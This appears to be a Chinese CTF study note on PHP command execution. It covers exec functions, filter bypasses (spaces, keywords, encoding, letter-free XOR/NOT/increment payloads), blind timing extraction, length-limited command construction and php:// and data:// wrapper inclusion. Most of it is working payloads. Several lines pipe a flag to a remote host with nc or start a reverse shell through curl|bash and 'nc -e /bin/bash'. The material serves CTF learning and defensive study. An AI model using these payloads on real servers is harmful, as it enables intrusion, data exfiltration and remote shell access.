---
title: PHP命令执行
date: 2024-9-18 23:32:55
tags: CTF
categories: CTF-Web
---



# 1.命令执行函数



首先科普一个PHP的特性: 单引号包裹的内容只能当做纯字符串, 而双引号包裹的内容, 可以识别变量, 所以源码中的 "$url" 可以当做 $url 变量被正常执行

switch循环有一个特点, 如果 case条件对应的代码体中没有 break或者其他循环控制的关键字, 则会继续执行下一个 case条件的代码, 这里我们传递 3, echo '@A@' 以后, 会继续执行 case 



**命令执行后面得加分号 ；**

### 1.system()

直接执行命令

### 2.exec($cmd,$Arrays)

只返回最后一行，返回所有需要输出的arrays

### 3.passthru（“”）

直接执行命令

### 4.shell_exec()

直接执行命令

```
 <?php highlight_file(__FILE__);
 $cmd = $_GET["cmd"];
 $output = shell_exec($cmd); 
 echo $output;
 ?> 
```

### 5.popen($cmd,$mode)

mode为'r'或'w' 无回显，读出后输出

```
 <?php
 highlight_file(__FILE__); 
 $cmd = $_GET["cmd"]; 
 $ben = popen($cmd,'r'); 
 while($s=fgets($ben))
 {   print_r($s); } 
 ?> 
```

### 6.proc_open 

```
 <?php
 header\("content-type:text/html;charset=utf-8"); 
 highlight_file(__FILE__);
 $cmd = $_GET["cmd"]; 
 $array =  array(   array("pipe","r"),  //标准输入 
 array("pipe","w"),  //标准输出内容   
 array("file","/tmp/error-output.txt","a")  //标准输出错误 ); 
 $fp = proc_open($cmd,$array,$pipes); //打开一个进程通道 
 echo stream_get_contents($pipes[1]);  //为什么是$pipes[1]，因为1是输出内容 
 proc_close($fp);
 ?> 
```



### 7.反引号

表示命令执行

### 8.eval（）

执行eval的参数

# 2.操作系统链接符

； 多个命令顺序执行，命令与命令之间相互独立

&多个命令顺序执行，命令与命令之间相互独立，&需要写为%26才有用

&& 前面命令执行成功则执行后面命令，前面错误后面也错误

| 将前面的输出作为后面命令的参数，只显示后面

|| 类似于if-else

# 3.空格过滤绕过

大括号{ls,-l}

$IFS代替空格 $IFS、$IFS&2、$IFS9、${IFS}

重定向字符< , <>

%09(Tab)   %20(Space)

# 4.文件名过滤

### 1.通配符

? 代替一个字符

'*' 自动匹配星号后面的

### 2.单引号双引号

'' ""

('cat fl""ag.p""hp ')

### 3.反斜线

cat f\lag.p\hp

### 4.特殊变量

$1,$9,$*,$@

fl$1ag.p$9hp

### 5.内敛执行

?cmd=passthru('a=fla;b=g;c=.ph;d=p;cat $a$b$c$d');

### 6.利用lunix中的环境变量

?cmd=passthru('echo $PATH'); 输出环境变量

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

第一位是0

echo f${PATH:5:1}   输出fl

# 5.常见文件读取命令绕过

1.tac:反向显示,倒数第一行，倒数第二行

2.more：一页一页的显示

3.less：与more相同

4.tail：显示最后10行

5.nl：作用和cat一样，输出时加上行号

6.od：以二进制的方式读取

7.od -A -d -c:转换为ascii码

8.xxd：二进制和ascii码都显示

9.sort：用于排序文件

10.uniq：报告或删除文件中重复的内容

11.file -f：报错出具体内容

# 6.编码绕过

##  1.base64编码

echo Y2F0IGZsYWcK | base64 -d | /bin/bash

echo Y2F0IGZsYWcK | base64 -d | bash

echo Y2F0IGZsYWcK | base64 -d | sh

\`echo Y2F0IGZsYWcK | base64 -d `     ``表示执行

$(echo Y2F0IGZsYWcK | base64 -d)

## 2.base32

将上述编码换位base32

## 3.HEX编码

echo 63617420666c61672e706870| xxd -r -p | /bin/bash

echo 63617420666c61672e706870| xxd -r -p| bash

echo 63617420666c61672e706870| xxd -r -p | sh

\`echo 63617420666c61672e706870| xxd -r -p `     ``表示执行

$(echo 63617420666c61672e706870| xxd -r -p)

## 4.shellcode

echo \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70

print \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70

# 7.无回显时间盲注

## 基本命令执行

sleep 

cat awk NR awk逐行获取数据

```shell
#cat flag.php
hello
benben
#cat flag.php | awk NR==1
hello
#cat awk NR==2
benben
```

cut -c cut命令逐列获取单个字符

```shell
#cat flag.php
hello
benben
#cat flag.php | awk NR==1 | cut -c 1
h
#cat flag.php | awk NR==1 | cut -c 3
l
```

## 盲注

```shell
#if [ $(cat flag | awk NR==2 |cut -c 1 ) == F];then echo "right";fi
```

```shell
#if [ $(cat flag | awk NR==2 |cut -c 1 ) == F];then sleep 1;fi
```

fi表示结束

# 8.长度限制绕过

## 基础知识：

**\>符号和\>>符号**

\>表示直接替换

\>>表示追加

**ls -t **

按时间顺序排列

**sh命令** 从文件中读取目录

**dir * 和rev命令** 

$(dir *)如果第一个文件名是命令的话，会当做命令来执行

rev 可以反转文件中的每一行的内容

## 长度为7的绕过

希望执行 cat flag|nc 123.60.57.4 7777

**步骤一**：创建文件

```
?cmd=>7777
?cmd=>\ \\
?cmd=>4\\
?cmd=>57.\\
?cmd=>60.\\
?cmd=>123.\\
?cmd=>c\ \\
?cmd=>\|n\\
?cmd=>flag\
?cmd=>t\ \\
?cmd=>ca\\
```

**步骤二：**将文件名按顺序写入到文件

```
?cmd=ls -t>a
```

**步骤三：**将文件内容进行解析

```
?cmd=sh a
?cmd=. a
```

## 长度为5的绕过

**步骤一：**构造ls -t>y 超过5个字符

先创建文件ls\

再创建文件_,将ls\写入到\_文件中

```
#ls>_
#>\ \\
#-t\\
#>\>y
#ls>>_
```

若执行sh_则会执行 ls -t>y

**步骤二：**分解命令，创造文件

```
#>bash
#>\|\\
#>61\\
#>1\\
#>1.\\
#>68\\
#>2.\\
#>19\\
#>\ \\
#>rl\\
#>cu\\
```

192.168.1.161下创建index.html

```
nc 192.168.1.161 7777 -e /bin/bash
```

**步骤三：**执行脚本sh

先执行sh _相当于执行ls -t>y

在执行sh y相当于执行y文件中的内容:curl 192.168.1.161|bash

## 长度为4的绕过

**步骤一：**构建ls -t>g

会用到dir* rev所以构造应该是反序

```
#>g\>
#>ht-          //h是按照时间排序
#>sl
#>dir
```

![image-20240522161439039](././././././././././PHP命令执行/image-20240522161540137.png)

```
#>g;
#>g\>
#>ht-
#>sl
#>dir
#*>v
#>rev
#*v>x
```

**步骤二：**构造反弹shell

```
curl 192.168.1.161|bash --->(进行16进制) curl 0xC0A801A1|bash
```

```
#>ash
#>b\
#>\|\
#>A1\
#>01\
#>A8\
#>C0\
#>0x\
#>\ \
#>rl\
#>cu\
#sh x
#sh g
```

**步骤三：**反弹回来的shell查看flag

192.168.1.161下创建index.html,内容如下：

```
nc 192.168.1.161 7777 -e /bin/bash
```



# 9.括号过滤绕过

php中有许多不用括号的函数

```
<?php
echo 123;
print 123;
die;
include "/etc/passwd";
require "/etc/passwd";
include_once "/etc/passwd";
require_once "etc/passwd";
?>
```

payload:

```
?cmd=include"$_GET[url]"?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

不加分号也可以

```
?cmd=include$_GET[url]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

# 10.文件包含

 include($c.".php");  //限制了.php后缀

data://与文件包含函数结合时，用户输入的data://流会被当做php文件执行

```
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

payload:

```
?c=data://text/palin,<?php echo system('cat flag');?>
```

对php过滤时：

```
?c=data://text:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
```

# 11.无参数命令执行

## 请求头绕过(php7.3)

getallheaders()获取所有头部信息，功能与上个相似apache_request_headers()

pos()获取第一个

end()获取最后一个

获取到之后进行执行即可

eval(pos(getallheaders()))

## 全局变量RCE(php5/7)

get_defined_vars()用于返回已经定义的变量方法

get>post>cookie>file>server

可以定义多个get方法，返回get方法的第二个参数然后执行

payload

```
?code=eval(end(pos(get_defined_vars())));&cmd=system('ls');
```

## 利用session（php5）

print_r(session_id(session_start()))打印phpsession的值

**方法一：**

```
show_source(session_id(session_start()));

修改phpsession=./flag
```

**方法二：**

```
eval(bin2hex(session_id(session_start())))
phpsession:将命令改为16进制编码
```

## scandir读取

print_r()打印

**show_source函数是highlight_file()函数的别名）此函数是对文件进行 PHP 语法高亮显示**

scandir()--列出指定路径下的所有文件
getcwd()--返回当前工作目录
current()--返回数组的第一个元素
array_reversre()--将数组的最后一个变为第一个，第一个变为最后一个，其他以此类推
array_flip()--交换数组的键和值
next()--返回数组的第二个元素
array_rand()--随机返回一个键值

<font color=red>**chdir()--将执行指令的权限转移到当前目录**
**例：当前目录是wwwroot目录**
**dirname(getcwd())是上级目录，但是页面任然在wwwroot页面，要读取上级目录下的文件就需要chdir，chdir(dirname(getcwd()))**
**用于读取任意目录下的文件**</font>
strtev()--字符串反转
crypt()--加密
hebrevc()

**当前目录**：

```
?code=print_r(localeconv()); //查看当前目录文件名
?code=print_r(current(localeconv())); //返回第一个，内容是‘.’
?code=print_r(scandir(current(localeconv()))); //查看当前目录下的文件
如果是在最前面就使用pos读取，或者current
如果是最后一个使用end读取，或者array_reverse()反转之后使用current读取
然后使用show_source()读取
```

```
?code=print_r(getcwd()); //查看当前路径
?code=print_r(scandir(getcwd())); //查看当前路径下的文件
然后读取操作如上
```

```
?code=print_r(getcwd(); //查看当前路径
?code=print_r(dirname(getcwd())); //查看当前路径的上一级路径
?code=print_r(dirname(chdir(dirname(getcwd()))); //将操作权限切换到上级目录
?code=print_r(scandir(dirname(chdir(dirname(getcwd())))); //读取上级目录下的文件
因为flag可能不是第一个或者最后一个，不能使用ord和pos，可以使用array_flip()交换数组的键和值，再使用array_rand()随机返回一个键值，再用show_source()读取
?code=print_r(array_rand(array_flid(scandir(dirname(chdir(dirname(getcwd())))))));
```

**根目录：**

```
?code=print_r(crypt(serialize(array()); //对这段字符串进行加密，最后一个字符可能会出现'/'
然后反转
?code=print_r(strrev(crypt(serialize(array()))));
```

<font color=red>ord()将第一个字符转为ascii码</font>

<font color=red>chr()转换为字符串</font>

```
?code=print_r(chr(ord(strrev(crypt(serialize(array()))))); //有概率得到字符‘/’
?code=print_r(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array())))))))));
```

# 12.无字母数字绕过

## 异或绕过

使用异或的方式，构造出想要使用的字符串的异或后的字符串

使用脚本

### php5

```
<?php
$a='assert';
$b='_POST';
$c=$$b;
$a($c['_'])
```

更改成异或的方式

```
<?php
$_ = "!((%)("^"@[[@[\\";
$__ = "!+/(("^"~{`{|";
$___ = $$__;
$_($__['_']);
?>
```

```
?cmd=$_ = "!((%)("^"@[[@[\\";$__ = "!+/(("^"~{`{|";$___ = $$__;$_($__['_']);

需要进行url编码
```

```
POST提交:_=system('ls')
```



### php7

```
<?php
$_ = "!+/(("^"~{`{|";
$__ = $$_;
`$__['_']`;
?>
```

```
?cmd=$_ = "!+/(("^"~{`{|";$__ = $$_;`($__['_'])`;

需要进行url编码
```

```
POST提交:_=system('ls')
```

## 取反绕过

### php5

```
<?php
$_=~("%9e%8c%8c%9a%8d%8b");
$__=~("%a0%af%b0%ac%ab");
$___=$$_;
$_($___[_]);
```

```
?cmd=$_=~("%9e%8c%8c%9a%8d%8b");$__=~("%a0%af%b0%ac%ab");$__=$$_;$_($__[_]);

需要进行url编码
```

POST提交:_=system('ls')

### php7

```
<?php
$__=~("%a0%af%b0%ac%ab");
$___=$$__;
`$___[_]`;
```

```
?cmd=$__=~("%a0%af%b0%ac%ab");$___=$$__;`$___[_]`;

需要进行url编码
```

POST提交:_=system('ls')

## 3.数字自增绕过

原理$a='A'

$a++='B';

```php
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;
$___($_[_]);  
```

```
$___($_[_]);  //ASSERT($_POST[_])
```

进行一次url编码，然后post提交

## 4.对符号进行过滤

### php过滤

```
<?=phpinfo();?>
```

### _过滤

```
?cmd=?><?=`{${~"%a0%B8%BA%AB"}[%a0]}`?>&%a0=ls
```

### _和$过滤

#### php7

```
?cmd=(call_user_func)(system,ls,'')
?cmd=(~%9C%9E%93%93%A0%8A%8C%9A%8D%A0%99%8A%91%9C)(~%8C%86%8C%8B%9A%92,~%93%8C,'');
```

####  php5

文件读取

php中post上传文件会把我们上传的文件暂存在<font color=red>/tmp</font>>目录下,

默认文件名是phpxxxxxx,文件名最后6个字符是随机的大小写字母

./???/????????[@-[]表示ASCII在@和[之间的字符，也就是大写字母，保障最后一位为大写字母

一：先构造一个文件上传的POST数据包

二：PHP页面生成临时文件phpxxxxxx，存储在/tmp目录下；

三：执行指令：./???/?????[@-[],读取文件，执行其中的指令

```
?cmd=?><?=`.+/???/????????[@-[]]`?>
```

![image-20240528184008629](././././././././././.\PHP命令执行\image-20240528183950627.png)

### ;~^`&|过滤

```php
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;
$___($_[_]); 
```

```php
<?=$_=[]?><?=$_=@"$_"?><?=$_=$_['!'=='@']?><?=$___=$_?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___.=$__?><?=$___.=$__?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___.=$__?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___.=$__?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$___.=$__?><?=$____='_'?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$____.=$__?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$____.=$__?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$____.=$__?><?=$__=$_?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$__++?><?=$____.=$__?><?=$_=$$____?><?=
$___($_[_])?>
```

# 13.无参数读文件和RCE漏洞

### 1.与RCE相关的危险函数 

 eval()  将字符串当作php代码执行
 assert()  将字符串当作php代码执行
 preg_replace()  将字符串正则匹配后替换
 call_user_func()  回调函数
 array_map()   回调函数



使用print_r()进行输出

使用readfile()或highlight_file()读取文件

highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名

next() 输出数组中的当前元素和下一个元素的值。

array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)

scandir() 函数返回指定目录中的文件和目录的数组。

pos() 输出数组中的当前元素的值。

localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是"."。

scandir（）用来获取目录文件

chr（47）是/的ASCII编码，因为/被过滤了



exp=print_r(scandir(pos(localeconv())))

打印数组

exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));

# 无数字无字母无~^

源码

```php
if(preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){
    die("cerror");
    }
if(preg_match("/\~|\!|\@|\#|\%|\^|\&|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){
    die("serror");
    }
eval($cmd);
```

只可以使用p ` ? / + < > =1

思路就是上传文件生成临时文件，将真正想要执行的函数放到临时文件中，然后利用eval函数进行执行临时文件。

## `<?= $cmd ?> 等于 <?php echo($cmd) ?>`

在php中，`<? ?>`称为短标签，`<?php ?>`称为长标签。修改PHP.ini文件配置 short_open_tag = On 才可使用短标签。php5.4.0以后， `<?= `总是可代替 `<? echo`。还要使用`?>`将前面的闭合掉

## 反引号``（键盘Tab键上面那个键）

  在php中反引号的作用是命令替换，将其中的字符串当成shell命令执行

## 点 .

​    点命令等于source命令，用来执行文件。

​    source /home/user/bash  等同于  . /home/user/bash

## 加号 +

​    URL编码中空格为%20，+表示为%2B。然而url中+也可以表示空格，要表示+号必须得用%2B。

## /??p/p?p??????

### ：临时文件夹目录

        php上传文件后会将文件存储在临时文件夹，然后用move_uploaded_file() 函数将上传的文件移动到新位置。临时文件夹可通过php.ini的upload_tmp_dir 指定，默认是/tmp目录。

### ：临时文件命名规则

        默认为 php+4或者6位随机数字和大小写字母，在windows下有tmp后缀，linux没有。比如windows下：phpXXXXXX.tmp  linux下：phpXXXXXX。

### ：通配符

        问号?代表一个任意字符，通配符/??p/p?p??????匹配/tmp/phpxxxxxx
## 上传文件

### Content-Type

​      Content-Type有两个值：

```
application/x-www-form-urlencoded(默认值) ：上传键值对
multipart/form-data：上传文件
```



### boundary

​        boundary为边界分隔符

        文件开始标记：-----------------------------10242300956292313528205888
    
        文件结束标记：-----------------------------10242300956292313528205888--
    
        其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。

### 文件内容

​        #! /bin/sh 指定命令解释器，#!是一个特殊的表示符，其后，跟着解释此脚本的shell路径。bash只是shell的一种，还有很多其它shell，如：sh,csh,ksh,tcsh。首先用命令ls /  来查看服务器根目录有哪些文件，发现有flag.txt，然后再用cat /flag.txt 即可。



请求头修改了三个地方

```php
POST /?cmd=?><?=`.+/??p/p?p??????`; HTTP/1.1
 
Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888
 
-----------------------------10242300956292313528205888
Content-Disposition: form-data; name="fileUpload"; filename="1.txt"
Content-Type: text/plain
 
#! /bin/sh
 
cat /flag.txt
-----------------------------10242300956292313528205888--
```

# 15.php伪协议/文件包含

## file函数

![img](././././././././././D:\MarkDown\CTF\CTFNotes\Perfect317\WEB\images\20210110135324804-1721131032936.png)

1.是格式
2.是可选参数，有read和write，字面意思就是读和写
3.是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）
4.是必选参数，后面写你要处理的文件名

php://filter/read=convert.base64-encode/resource=index.php

php://filter/convert.base64-encode/resource=index.php

在绕过一些WAF时有用



php://filter/resource=index.php



## data命令

text=data://text:text/plain,内容

```
？file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=

PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <?php system('cat flag.php');

```

读取phpinfo()

```
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

data://text/plain,<?php%20phpinfo();?>
```

file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流

## 对php进行过滤

使用data协议

或者使用?file=Php://input任意命令执行

post提交对应命令

![image-20240716195808334](././././././././././D:\MarkDown\CTF\CTFNotes\Perfect317\WEB\images\image-20240716195808334.png)

![image-20240716195817975](././././././././././D:\MarkDown\CTF\CTFNotes\Perfect317\WEB\images\image-20240716195817975.png)

## 4.查看日志方法

nginx服务器的日志通常为/var/log/nginx/access.log

或/var/log/nginx/error.log

使用file读取日志文件

```
?file=/var/log/nginx/access.log
```

查看日志文件记录的是什么

例记录User-Agent,则可以在User-Agent中写入php语句实现命令执行